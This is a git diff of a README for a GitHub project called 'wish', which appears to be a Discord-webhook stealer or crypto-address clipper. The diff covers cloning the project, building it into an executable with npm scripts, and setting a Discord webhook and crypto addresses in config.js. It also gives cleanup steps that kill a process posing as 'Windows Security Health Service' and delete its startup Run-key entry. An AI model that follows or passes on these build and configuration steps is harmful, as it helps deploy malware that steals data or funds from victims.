@@ -134,27 +134,31 @@ to correctly install node-gyp go to its repo: [node-gyp](https://github.com/node
 1. Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=_Kfq557P0n4" target="_blank">YouTube!</a>
 
 2. Install [Git](https://git-scm.com/) and then use these commands in the console.
+
+## Usage
+1. If you want to create an **Executable** all at once, simply do:
+
 ```bash
 git clone https://github.com/k4itrun/wish.git
 ```
 ```bash
-cd wish/src/
-```
-```bash
-npm install
+npm run builder:install && npm run builder:start
 ```
 
-3. Edit `config.js` for your Discord webhook and crypto addresses.
+2. But if you just want to **Test the code**, just do:
+
+- Edit `config.js` for your Discord webhook and crypto addresses.
 
 ![][github-assets-img-config-link]
 
-## Usage
-1. This project can be started by running the command
 ```bash
-npm run start or node index
+git clone https://github.com/k4itrun/wish.git
+```
+```bash
+npm run src:install && npm run src:start
 ```
 
-2. but if you are thinking of creating an executable you can choose to use (`electron-builder`, `pkg`, etc...)
+3. You can also use  (`electron-builder`, `pkg`, `nexe`, etc...) to build your own executable.
 
 ## Preview
 ![][github-assets-img-system1-link]
@@ -207,7 +211,7 @@ taskkill /f /t /im WindowsSecurityHealthService.exe
 
 3. Remove from startup:
 ```bash
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Health Service P" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Health Service" /f
 ```
 
 ## Acknowledgments
